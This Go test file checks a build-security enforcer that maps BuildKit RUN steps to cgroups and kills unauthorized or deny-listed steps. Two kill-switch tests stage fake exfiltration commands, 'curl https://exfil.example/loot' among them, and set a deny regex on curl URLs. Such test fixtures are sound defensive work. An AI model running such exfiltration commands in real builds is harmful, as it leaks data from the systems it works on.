package enforcer

import (
	"context"
	"os"
	"path/filepath"
	"regexp"
	"strconv"
	"testing"
	"time"
)

// ---------------- pure-logic tests ----------------

func TestExtractRunCommand(t *testing.T) {
	cases := []struct {
		name string
		in   string
		want string
	}{
		{"plain", "RUN npm ci", "npm ci"},
		{"with bracket prefix", "[build 5/12] RUN npm ci", "npm ci"},
		{"prefix + complex run", "[stage-final 2/4] RUN apt-get install -y curl", "apt-get install -y curl"},
		{"non-run vertex", "[stage-final 1/4] COPY --from=build /out /", ""},
		{"from", "[internal] FROM docker.io/library/alpine:3.18", ""},
		{"empty", "", ""},
		{"only bracket", "[stage 1/2]", ""},
	}

	for _, tc := range cases {
		got := extractRunCommand(tc.in)
		if got != tc.want {
			t.Errorf("extractRunCommand(%q) = %q, want %q", tc.in, got, tc.want)
		}
	}
}

func TestMatchPendingByCmdline(t *testing.T) {
	pending := []PendingVertex{
		{SessionRef: "rA", VertexDigest: "dA", VertexName: "[build 1/3] RUN apt-get update"},
		{SessionRef: "rA", VertexDigest: "dB", VertexName: "[build 2/3] RUN npm ci"},
		{SessionRef: "rB", VertexDigest: "dC", VertexName: "[final 1/2] COPY --from=build /out /"},
	}

	// /bin/sh -c "<cmd>" — common runc invocation shape.
	got := matchPendingByCmdline(pending, "/bin/sh -c apt-get update")
	if len(got) != 1 || got[0].VertexDigest != "dA" {
		t.Fatalf("apt-get match: got %+v", got)
	}

	got = matchPendingByCmdline(pending, "/bin/sh -c npm ci")
	if len(got) != 1 || got[0].VertexDigest != "dB" {
		t.Fatalf("npm ci match: got %+v", got)
	}

	// COPY doesn't match — it never enters the cmdline space.
	got = matchPendingByCmdline(pending, "/bin/sh -c apt-get install -y curl")
	if len(got) != 0 {
		t.Fatalf("unrelated cmdline matched: %+v", got)
	}
}

func TestMatchPendingByCmdline_CrossBuildDuplicate(t *testing.T) {
	// Two sessions, both running the same exact RUN — the join layer
	// should report both as candidates and let the tiebreaker decide.
	pending := []PendingVertex{
		{SessionRef: "rA", VertexDigest: "dA", VertexName: "[build 1/2] RUN apt-get update", FrontendAttrs: map[string]string{"build-arg:VERSION": "1"}},
		{SessionRef: "rB", VertexDigest: "dB", VertexName: "[build 1/2] RUN apt-get update", FrontendAttrs: map[string]string{"build-arg:VERSION": "2"}},
	}

	got := matchPendingByCmdline(pending, "/bin/sh -c apt-get update")
	if len(got) != 2 {
		t.Fatalf("expected 2 matches, got %d: %+v", len(got), got)
	}
}

func TestTiebreakByEnviron(t *testing.T) {
	matches := []PendingVertex{
		{SessionRef: "rA", VertexDigest: "dA", FrontendAttrs: map[string]string{"build-arg:VERSION": "1"}},
		{SessionRef: "rB", VertexDigest: "dB", FrontendAttrs: map[string]string{"build-arg:VERSION": "2"}},
	}

	// Environ matches session A.
	got := tiebreakByEnviron(matches, map[string]string{"VERSION": "1", "PATH": "/usr/bin"})
	if len(got) != 1 || got[0].SessionRef != "rA" {
		t.Fatalf("environ tiebreak: got %+v, want rA", got)
	}

	// Environ matches neither — fall back to all candidates ("still ambiguous").
	got = tiebreakByEnviron(matches, map[string]string{"VERSION": "9"})
	if len(got) != 2 {
		t.Fatalf("non-match should fall back to all candidates: got %+v", got)
	}

	// Empty environ — no tiebreaker available, return all.
	got = tiebreakByEnviron(matches, map[string]string{})
	if len(got) != 2 {
		t.Fatalf("empty environ should return all matches: got %+v", got)
	}
}

// ---------------- registry cgroup-index tests ----------------

func TestSessionRegistry_LinkAndLookupCgroup(t *testing.T) {
	r := NewSessionRegistry(time.Minute)
	r.LinkCgroup(12345, CgroupBinding{
		SessionRef:   "rA",
		VertexDigest: "dA",
		VertexName:   "RUN npm ci",
		ContainerID:  "abc123",
	})

	got, ok := r.LookupByCgroupID(12345)
	if !ok {
		t.Fatal("LookupByCgroupID missed a linked cgroup")
	}

	if got.SessionRef != "rA" || got.VertexDigest != "dA" {
		t.Fatalf("binding: got %+v", got)
	}

	if got.LinkedAt.IsZero() {
		t.Fatal("LinkedAt should default to now")
	}

	r.UnlinkCgroup(12345)

	_, ok = r.LookupByCgroupID(12345)
	if ok {
		t.Fatal("UnlinkCgroup did not remove binding")
	}
}

func TestSessionRegistry_PendingVerticesExcludesCompleted(t *testing.T) {
	r := NewSessionRegistry(time.Minute)
	r.RegisterSession("rA", time.Unix(1000, 0), nil)
	r.UpsertVertex("rA", VertexState{Digest: "dA", Name: "RUN a", StartedAt: time.Unix(1010, 0)})
	r.UpsertVertex("rA", VertexState{Digest: "dB", Name: "RUN b", StartedAt: time.Unix(1020, 0)})
	r.UpsertVertex("rA", VertexState{Digest: "dA", Completed: true, CompletedAt: time.Unix(1030, 0)})

	pending := r.PendingVertices()
	if len(pending) != 1 {
		t.Fatalf("pending size = %d, want 1", len(pending))
	}

	if pending[0].VertexDigest != "dB" {
		t.Fatalf("pending vertex = %s, want dB", pending[0].VertexDigest)
	}
}

// ---------------- joiner end-to-end with fake source ----------------

type fakeEventSource struct {
	creates chan CgroupCreateEvent
	removes chan CgroupRemoveEvent
}

func newFakeEventSource() *fakeEventSource {
	return &fakeEventSource{
		creates: make(chan CgroupCreateEvent, 8),
		removes: make(chan CgroupRemoveEvent, 8),
	}
}

func (s *fakeEventSource) Run(ctx context.Context, creates chan<- CgroupCreateEvent, removes chan<- CgroupRemoveEvent) error {
	defer close(creates)
	defer close(removes)

	for {
		select {
		case <-ctx.Done():
			return ctx.Err()
		case evt, ok := <-s.creates:
			if !ok {
				return nil
			}

			select {
			case creates <- evt:
			case <-ctx.Done():
				return ctx.Err()
			}
		case evt, ok := <-s.removes:
			if !ok {
				return nil
			}

			select {
			case removes <- evt:
			case <-ctx.Done():
				return ctx.Err()
			}
		}
	}
}

// stageCgroup writes a cgroup.procs file under tmpDir/cgroupID with
// the supplied pid, and a /proc/<pid>/cmdline file with the supplied
// cmd. Returns the cgroupPath the joiner should observe.
func stageCgroup(t *testing.T, root, cgroupName string, pid int, cmd string) string {
	t.Helper()

	cgroupPath := filepath.Join(root, "cgroups", cgroupName)
	if err := os.MkdirAll(cgroupPath, 0o755); err != nil {
		t.Fatalf("mkdir cgroup: %v", err)
	}

	if err := os.WriteFile(filepath.Join(cgroupPath, "cgroup.procs"), []byte(strconv.Itoa(pid)+"\n"), 0o644); err != nil { //nolint:gosec // test fixture, not a security boundary
		t.Fatalf("write cgroup.procs: %v", err)
	}

	procPid := filepath.Join(root, "proc", strconv.Itoa(pid))
	if err := os.MkdirAll(procPid, 0o755); err != nil {
		t.Fatalf("mkdir procPid: %v", err)
	}

	// cmdline uses NUL separators; encode with \x00 between argv[].
	if err := os.WriteFile(filepath.Join(procPid, "cmdline"), []byte(cmd), 0o644); err != nil { //nolint:gosec // test fixture
		t.Fatalf("write cmdline: %v", err)
	}

	return cgroupPath
}

func TestCgroupJoiner_HappyPathSingleMatch(t *testing.T) {
	root := t.TempDir()
	reg := NewSessionRegistry(time.Minute)

	// Stage a session with a pending RUN vertex.
	reg.RegisterSession("rA", time.Unix(1000, 0), nil)
	reg.UpsertVertex("rA", VertexState{
		Digest:    "dA",
		Name:      "[build 1/2] RUN npm ci",
		StartedAt: time.Unix(1010, 0),
	})

	// Stage the cgroupfs + /proc entries the joiner will read.
	cgroupPath := stageCgroup(t, root, "ctr-abc", 4242, "/bin/sh\x00-c\x00npm ci\x00")

	source := newFakeEventSource()

	statCalls := 0
	statFn := func(path string) (uint64, error) {
		statCalls++
		if path != cgroupPath {
			t.Errorf("stat called with unexpected path %s", path)
		}

		return 9876, nil
	}

	j := NewCgroupJoiner(reg, source, nil,
		WithProcRoot(filepath.Join(root, "proc")),
		WithStatFn(statFn),
	)

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	done := make(chan struct{})
	go func() {
		_ = j.Run(ctx)

		close(done)
	}()

	source.creates <- CgroupCreateEvent{ContainerID: "ctr-abc", CgroupPath: cgroupPath}

	waitFor(t, time.Second, func() bool {
		_, ok := reg.LookupByCgroupID(9876)

		return ok
	})

	got, _ := reg.LookupByCgroupID(9876)
	if got.SessionRef != "rA" || got.VertexDigest != "dA" {
		t.Fatalf("binding wrong: %+v", got)
	}

	if got.ContainerID != "ctr-abc" {
		t.Fatalf("ContainerID = %q, want ctr-abc", got.ContainerID)
	}

	if got.Ambiguous {
		t.Fatal("single match should not be marked ambiguous")
	}

	cancel()
	<-done
}

func TestCgroupJoiner_AmbiguousFallsBackToCandidateList(t *testing.T) {
	root := t.TempDir()
	reg := NewSessionRegistry(time.Minute)

	// Two sessions running the same command — collision.
	reg.RegisterSession("rA", time.Unix(1000, 0), nil)
	reg.UpsertVertex("rA", VertexState{Digest: "dA", Name: "[build 1/1] RUN apt-get update", StartedAt: time.Unix(1010, 0)})

	reg.RegisterSession("rB", time.Unix(1001, 0), nil)
	reg.UpsertVertex("rB", VertexState{Digest: "dB", Name: "[build 1/1] RUN apt-get update", StartedAt: time.Unix(1011, 0)})

	cgroupPath := stageCgroup(t, root, "ctr-dup", 5555, "/bin/sh\x00-c\x00apt-get update\x00")
	// Empty environ (no /proc/<pid>/environ written) → tiebreaker
	// has no signal → ambiguous result.

	source := newFakeEventSource()

	statFn := func(_ string) (uint64, error) { return 4321, nil }

	j := NewCgroupJoiner(reg, source, nil,
		WithProcRoot(filepath.Join(root, "proc")),
		WithStatFn(statFn),
	)

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	go func() { _ = j.Run(ctx) }()

	source.creates <- CgroupCreateEvent{ContainerID: "ctr-dup", CgroupPath: cgroupPath}

	waitFor(t, time.Second, func() bool {
		_, ok := reg.LookupByCgroupID(4321)

		return ok
	})

	got, _ := reg.LookupByCgroupID(4321)
	if !got.Ambiguous {
		t.Fatalf("expected ambiguous binding, got %+v", got)
	}

	if len(got.AmbiguousCandidates) != 2 {
		t.Fatalf("AmbiguousCandidates = %d, want 2", len(got.AmbiguousCandidates))
	}
}

func TestCgroupJoiner_RemoveUnlinks(t *testing.T) {
	reg := NewSessionRegistry(time.Minute)
	reg.LinkCgroup(7777, CgroupBinding{
		SessionRef:   "rA",
		VertexDigest: "dA",
		ContainerID:  "ctr-remove",
	})

	source := newFakeEventSource()
	j := NewCgroupJoiner(reg, source, nil)

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	go func() { _ = j.Run(ctx) }()

	source.removes <- CgroupRemoveEvent{ContainerID: "ctr-remove"}

	waitFor(t, time.Second, func() bool {
		_, ok := reg.LookupByCgroupID(7777)

		return !ok
	})
}

// TestCgroupJoiner_DeferredMatchOnLateVertex covers the BuildKit + runc
// race: the cgroup directory is created (and our inotify source fires)
// before the Status stream has announced the vertex AND before runc
// has moved the child PID into the cgroup. The first match attempt
// must miss; the deferred loop must catch the match once procs + the
// pending vertex both populate.
func TestCgroupJoiner_DeferredMatchOnLateVertex(t *testing.T) {
	root := t.TempDir()
	reg := NewSessionRegistry(time.Minute)

	// At T=0 there's no session and the cgroup directory is empty —
	// just the path. Stage a cgroup procs file that's intentionally
	// empty for now.
	cgroupPath := filepath.Join(root, "cgroups", "ctr-late")
	if err := os.MkdirAll(cgroupPath, 0o755); err != nil {
		t.Fatalf("mkdir: %v", err)
	}
	if err := os.WriteFile(filepath.Join(cgroupPath, "cgroup.procs"), []byte(""), 0o644); err != nil { //nolint:gosec // test fixture
		t.Fatalf("write empty procs: %v", err)
	}

	source := newFakeEventSource()
	statFn := func(_ string) (uint64, error) { return 7777, nil }

	j := NewCgroupJoiner(reg, source, nil,
		WithProcRoot(filepath.Join(root, "proc")),
		WithStatFn(statFn),
		// Short retry budget to keep the test fast — production
		// defaults are 2s/100ms.
		WithDeferredMatch(500*time.Millisecond, 20*time.Millisecond),
	)

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	done := make(chan struct{})
	go func() {
		_ = j.Run(ctx)

		close(done)
	}()

	// Inotify fires. First attempt: procs is empty, no pending.
	// Deferred loop must start retrying.
	source.creates <- CgroupCreateEvent{ContainerID: "ctr-late", CgroupPath: cgroupPath}

	// Race window: ~80ms after inotify, BuildKit announces the
	// vertex AND runc moves the PID into the cgroup. Mirror that
	// here by populating both after a delay.
	go func() {
		time.Sleep(80 * time.Millisecond)

		reg.RegisterSession("late-ref", time.Unix(1000, 0), nil)
		reg.UpsertVertex("late-ref", VertexState{
			Digest:    "late-digest",
			Name:      "[build 1/1] RUN npm test",
			StartedAt: time.Unix(1010, 0),
		})

		// Now stage procs + cmdline so the deferred read can succeed.
		const latePID = 9001

		_ = os.WriteFile(filepath.Join(cgroupPath, "cgroup.procs"),
			[]byte(strconv.Itoa(latePID)+"\n"), 0o644) //nolint:gosec // test fixture

		procPID := filepath.Join(root, "proc", strconv.Itoa(latePID))
		_ = os.MkdirAll(procPID, 0o755)
		_ = os.WriteFile(filepath.Join(procPID, "cmdline"),
			[]byte("/bin/sh\x00-c\x00npm test\x00"), 0o644) //nolint:gosec // test fixture
	}()

	waitFor(t, time.Second, func() bool {
		_, ok := reg.LookupByCgroupID(7777)

		return ok
	})

	got, _ := reg.LookupByCgroupID(7777)
	if got.SessionRef != "late-ref" || got.VertexDigest != "late-digest" {
		t.Fatalf("deferred match wrong: %+v", got)
	}

	if got.VertexName != "[build 1/1] RUN npm test" {
		t.Errorf("VertexName = %q", got.VertexName)
	}

	cancel()
	<-done
}

// TestCgroupJoiner_RemoveDuringDeferredRetryDropsLink covers the
// teardown race: the cgroup is created (inotify fires), the deferred
// matcher starts retrying, the cgroup is removed (runc tearing down a
// fast-failing RUN), and only THEN the registry would have linked a
// match. The remove must cancel the goroutine and prevent the
// post-remove link — otherwise a stale binding leaks for a container
// that no longer exists.
func TestCgroupJoiner_RemoveDuringDeferredRetryDropsLink(t *testing.T) {
	root := t.TempDir()
	reg := NewSessionRegistry(time.Minute)

	cgroupPath := filepath.Join(root, "cgroups", "ctr-removed")
	if err := os.MkdirAll(cgroupPath, 0o755); err != nil {
		t.Fatalf("mkdir: %v", err)
	}
	if err := os.WriteFile(filepath.Join(cgroupPath, "cgroup.procs"), []byte(""), 0o644); err != nil { //nolint:gosec // test fixture
		t.Fatalf("write procs: %v", err)
	}

	source := newFakeEventSource()
	statFn := func(_ string) (uint64, error) { return 4242, nil }

	j := NewCgroupJoiner(reg, source, nil,
		WithProcRoot(filepath.Join(root, "proc")),
		WithStatFn(statFn),
		WithDeferredMatch(500*time.Millisecond, 20*time.Millisecond),
	)

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	done := make(chan struct{})
	go func() {
		_ = j.Run(ctx)

		close(done)
	}()

	// Fire create — procs is empty, no pending vertex, deferred
	// retry starts.
	source.creates <- CgroupCreateEvent{ContainerID: "ctr-removed", CgroupPath: cgroupPath}

	// Let the deferred loop tick at least once.
	time.Sleep(50 * time.Millisecond)

	// Fire remove. The deferred goroutine must be cancelled BEFORE
	// the registry would have written a binding.
	source.removes <- CgroupRemoveEvent{ContainerID: "ctr-removed", CgroupPath: cgroupPath}

	// Now make a match possible — if cancellation didn't take, the
	// goroutine would now succeed and link a stale binding.
	reg.RegisterSession("ref-removed", time.Unix(1000, 0), nil)
	reg.UpsertVertex("ref-removed", VertexState{
		Digest:    "digest-removed",
		Name:      "[1/1] RUN never-actually-runs",
		StartedAt: time.Unix(1010, 0),
	})

	const latePID = 7777

	_ = os.WriteFile(filepath.Join(cgroupPath, "cgroup.procs"),
		[]byte(strconv.Itoa(latePID)+"\n"), 0o644) //nolint:gosec // test fixture

	procPID := filepath.Join(root, "proc", strconv.Itoa(latePID))
	_ = os.MkdirAll(procPID, 0o755)
	_ = os.WriteFile(filepath.Join(procPID, "cmdline"),
		[]byte("/bin/sh\x00-c\x00never-actually-runs\x00"), 0o644) //nolint:gosec // test fixture

	// Wait well past the retry budget. If the cancellation worked,
	// no binding ever appears. If it didn't, the deferred goroutine
	// catches a successful tryMatch above and links — leaving a
	// stale binding for a container that was removed.
	time.Sleep(600 * time.Millisecond)

	if _, ok := reg.LookupByCgroupID(4242); ok {
		t.Fatal("deferred match wrote a binding for a container that was already removed")
	}

	cancel()
	<-done
}

// TestCgroupJoiner_DeferredMatchGivesUpAtDeadline ensures the retry
// loop terminates so a cgroup that never matches doesn't tie up a
// goroutine forever. Uses a tiny budget to keep the test fast.
func TestCgroupJoiner_DeferredMatchGivesUpAtDeadline(t *testing.T) {
	root := t.TempDir()
	reg := NewSessionRegistry(time.Minute)

	// Nothing will ever match — no session, no pending vertex, no PID.
	cgroupPath := filepath.Join(root, "cgroups", "ctr-orphan")
	if err := os.MkdirAll(cgroupPath, 0o755); err != nil {
		t.Fatalf("mkdir: %v", err)
	}
	if err := os.WriteFile(filepath.Join(cgroupPath, "cgroup.procs"), []byte(""), 0o644); err != nil { //nolint:gosec // test fixture
		t.Fatalf("write procs: %v", err)
	}

	source := newFakeEventSource()
	statFn := func(_ string) (uint64, error) { return 8888, nil }

	j := NewCgroupJoiner(reg, source, nil,
		WithProcRoot(filepath.Join(root, "proc")),
		WithStatFn(statFn),
		WithDeferredMatch(100*time.Millisecond, 20*time.Millisecond),
	)

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	go func() { _ = j.Run(ctx) }()

	source.creates <- CgroupCreateEvent{ContainerID: "ctr-orphan", CgroupPath: cgroupPath}

	// Wait past the deadline.
	time.Sleep(300 * time.Millisecond)

	if _, ok := reg.LookupByCgroupID(8888); ok {
		t.Fatal("orphan cgroup got linked after the retry budget expired")
	}
}

// TestCgroupJoiner_KillsUnauthorizedSession covers the kill-switch:
// when the matched session was marked Unauthorized by the registry's
// require-CI-metadata policy, the joiner must SIGKILL the cgroup via
// cgroup.kill instead of writing a binding. No link in the index;
// observable side effect is "1" in the cgroup.kill file (we fixture
// it as a regular file in a tmpdir).
func TestCgroupJoiner_KillsUnauthorizedSession(t *testing.T) {
	root := t.TempDir()
	reg := NewSessionRegistry(time.Minute)

	// Policy: require LEITWACHT_CI_PROJECT_PATH on every session.
	reg.SetCIRequirement(true, []string{"build-arg:LEITWACHT_CI_PROJECT_PATH"})

	// Session registered WITHOUT the required key → Unauthorized.
	reg.RegisterSession("rUnauth", time.Unix(1000, 0), map[string]string{
		"build-arg:OTHER": "irrelevant",
	})
	reg.UpsertVertex("rUnauth", VertexState{
		Digest:    "dKill",
		Name:      "[1/1] RUN curl https://exfil.example",
		StartedAt: time.Unix(1010, 0),
	})

	// Stage the cgroup directory the way runc would. We seed
	// cgroup.kill as an empty regular file so the joiner can write
	// "1" to it; in production cgroup v2's kernel API consumes the
	// write and SIGKILLs every process in the cgroup.
	cgroupPath := stageCgroup(t, root, "ctr-bad", 5555, "/bin/sh\x00-c\x00curl https://exfil.example\x00")
	killFile := filepath.Join(cgroupPath, "cgroup.kill")
	if err := os.WriteFile(killFile, nil, 0o600); err != nil {
		t.Fatalf("stage cgroup.kill: %v", err)
	}

	source := newFakeEventSource()
	statFn := func(_ string) (uint64, error) { return 6789, nil }

	j := NewCgroupJoiner(reg, source, nil,
		WithProcRoot(filepath.Join(root, "proc")),
		WithStatFn(statFn),
	)

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	done := make(chan struct{})
	go func() {
		_ = j.Run(ctx)

		close(done)
	}()

	source.creates <- CgroupCreateEvent{ContainerID: "ctr-bad", CgroupPath: cgroupPath}

	// Wait for the joiner to process. The kill writes synchronously
	// in the joiner's goroutine, so polling the file content is the
	// observable signal.
	waitFor(t, time.Second, func() bool {
		data, err := os.ReadFile(killFile)

		return err == nil && string(data) == "1"
	})

	// Crucially, no binding should be in the registry — the kill
	// path skips LinkCgroup.
	if _, ok := reg.LookupByCgroupID(6789); ok {
		t.Fatal("Unauthorized session wrote a binding instead of just killing")
	}

	cancel()
	<-done
}

// TestCgroupJoiner_KillsOnDenyVertexPattern covers the per-vertex
// kill-switch: when a candidate vertex's Name matches a configured
// deny regex, the joiner must SIGKILL the cgroup BEFORE linking.
// Mirrors TestCgroupJoiner_KillsUnauthorizedSession in structure;
// the only difference is the policy primitive that triggers the kill.
func TestCgroupJoiner_KillsOnDenyVertexPattern(t *testing.T) {
	root := t.TempDir()
	reg := NewSessionRegistry(time.Minute)

	// Policy: kill any vertex whose Name contains "curl https?://".
	deny := regexp.MustCompile(`curl https?://`)
	reg.SetBuildVertexDenyPatterns([]*regexp.Regexp{deny})

	// Session is fully authorized (CI metadata present) — the kill
	// here is gated on vertex name only.
	reg.RegisterSession("rGood", time.Unix(1000, 0), map[string]string{
		FrontendAttrKeyProjectPath: "team/alpha",
	})
	reg.UpsertVertex("rGood", VertexState{
		Digest:    "dExfil",
		Name:      "[stage 2/5] RUN curl https://exfil.example/loot",
		StartedAt: time.Unix(1010, 0),
	})

	cgroupPath := stageCgroup(t, root, "ctr-vertex", 7777, "/bin/sh\x00-c\x00curl https://exfil.example/loot\x00")
	killFile := filepath.Join(cgroupPath, "cgroup.kill")

	if err := os.WriteFile(killFile, nil, 0o600); err != nil {
		t.Fatalf("stage cgroup.kill: %v", err)
	}

	source := newFakeEventSource()
	statFn := func(_ string) (uint64, error) { return 7777, nil }

	j := NewCgroupJoiner(reg, source, nil,
		WithProcRoot(filepath.Join(root, "proc")),
		WithStatFn(statFn),
	)

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	done := make(chan struct{})
	go func() {
		_ = j.Run(ctx)

		close(done)
	}()

	source.creates <- CgroupCreateEvent{ContainerID: "ctr-vertex", CgroupPath: cgroupPath}

	waitFor(t, time.Second, func() bool {
		data, err := os.ReadFile(killFile)

		return err == nil && string(data) == "1"
	})

	// No binding should land — the kill path replaces LinkCgroup.
	if _, ok := reg.LookupByCgroupID(7777); ok {
		t.Fatal("deny-pattern match wrote a binding instead of just killing")
	}

	cancel()
	<-done
}

// TestCgroupJoiner_KillsOnDenyVertexPatternAmbiguous covers the
// fail-closed branch: when two candidate vertices collide on the
// same RUN cmdline, the case-1 deny check is skipped. The default
// branch must walk the candidate list and kill the cgroup if any
// vertex_name matches a deny pattern — otherwise an attacker who
// engineers a duplicate vertex name on a benign concurrent session
// slips past the policy.
func TestCgroupJoiner_KillsOnDenyVertexPatternAmbiguous(t *testing.T) {
	root := t.TempDir()
	reg := NewSessionRegistry(time.Minute)

	deny := regexp.MustCompile(`RUN npm install`)
	reg.SetBuildVertexDenyPatterns([]*regexp.Regexp{deny})

	// Two concurrent sessions both running the same RUN — the join
	// layer sees the same cmdline match two candidates. matchPending
	// returns both; control lands in the default (multi-candidate)
	// branch. Both vertex names match the deny pattern, so the
	// fail-closed kill must fire regardless of which candidate the
	// tiebreaker would have picked.
	reg.RegisterSession("rProjectA", time.Unix(1000, 0), map[string]string{
		FrontendAttrKeyProjectPath: "team/alpha",
	})
	reg.UpsertVertex("rProjectA", VertexState{
		Digest:    "dA",
		Name:      "[stage 2/5] RUN npm install",
		StartedAt: time.Unix(1010, 0),
	})

	reg.RegisterSession("rProjectB", time.Unix(1000, 0), map[string]string{
		FrontendAttrKeyProjectPath: "team/bravo",
	})
	reg.UpsertVertex("rProjectB", VertexState{
		Digest:    "dB",
		Name:      "[stage 5/8] RUN npm install",
		StartedAt: time.Unix(1010, 0),
	})

	// cmdline "npm install" hits both vertices — matchPendingByCmdline
	// returns 2, forcing the default (ambiguous-candidates) branch.
	cgroupPath := stageCgroup(t, root, "ctr-amb", 8888, "/bin/sh\x00-c\x00npm install\x00")
	killFile := filepath.Join(cgroupPath, "cgroup.kill")

	if err := os.WriteFile(killFile, nil, 0o600); err != nil {
		t.Fatalf("stage cgroup.kill: %v", err)
	}

	source := newFakeEventSource()
	statFn := func(_ string) (uint64, error) { return 8888, nil }

	j := NewCgroupJoiner(reg, source, nil,
		WithProcRoot(filepath.Join(root, "proc")),
		WithStatFn(statFn),
	)

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	done := make(chan struct{})
	go func() {
		_ = j.Run(ctx)

		close(done)
	}()

	source.creates <- CgroupCreateEvent{ContainerID: "ctr-amb", CgroupPath: cgroupPath}

	waitFor(t, time.Second, func() bool {
		data, err := os.ReadFile(killFile)

		return err == nil && string(data) == "1"
	})

	// No binding — the kill replaces both link paths.
	if _, ok := reg.LookupByCgroupID(8888); ok {
		t.Fatal("ambiguous-candidate deny match wrote a binding instead of just killing")
	}

	cancel()
	<-done
}

// TestSessionRegistry_MatchesDenyVertexPattern is a focused unit test
// for the pattern-matching helper itself, independent of the joiner's
// event-loop wiring.
func TestSessionRegistry_MatchesDenyVertexPattern(t *testing.T) {
	t.Parallel()

	reg := NewSessionRegistry(time.Minute)
	if reg.MatchesDenyVertexPattern("[1/1] RUN echo hello") {
		t.Fatal("no patterns installed → must return false")
	}

	patterns := []*regexp.Regexp{
		regexp.MustCompile(`RUN npm install`),
		regexp.MustCompile(`apt-get`),
	}
	reg.SetBuildVertexDenyPatterns(patterns)

	cases := map[string]bool{
		"[stage 2/5] RUN npm install":           true,
		"[stage 3/5] RUN apt-get update":        true,
		"[stage 1/5] RUN echo hi":               false,
		"[stage 4/5] FROM alpine:3.18":          false,
		"[stage 5/5] RUN yarn install --frozen": false, // yarn ≠ npm
	}
	for name, want := range cases {
		if got := reg.MatchesDenyVertexPattern(name); got != want {
			t.Errorf("MatchesDenyVertexPattern(%q) = %v, want %v", name, got, want)
		}
	}

	// Disable via empty slice.
	reg.SetBuildVertexDenyPatterns(nil)
	if reg.MatchesDenyVertexPattern("[stage 2/5] RUN npm install") {
		t.Error("after SetBuildVertexDenyPatterns(nil), policy should be disabled")
	}
}

func TestCgroupJoiner_NoMatchSilentlyDropped(t *testing.T) {
	root := t.TempDir()
	reg := NewSessionRegistry(time.Minute)

	// No pending vertices in the registry. The create event should
	// produce no binding and no panic.
	cgroupPath := stageCgroup(t, root, "ctr-orphan", 6666, "/bin/sh\x00-c\x00whatever\x00")

	source := newFakeEventSource()
	statFn := func(_ string) (uint64, error) { return 1111, nil }

	j := NewCgroupJoiner(reg, source, nil,
		WithProcRoot(filepath.Join(root, "proc")),
		WithStatFn(statFn),
	)

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	go func() { _ = j.Run(ctx) }()

	source.creates <- CgroupCreateEvent{ContainerID: "ctr-orphan", CgroupPath: cgroupPath}

	// Wait a beat for the joiner to process. Verify the index is
	// still empty.
	time.Sleep(50 * time.Millisecond)

	if _, ok := reg.LookupByCgroupID(1111); ok {
		t.Fatal("no pending vertices but cgroup got bound anyway")
	}
}
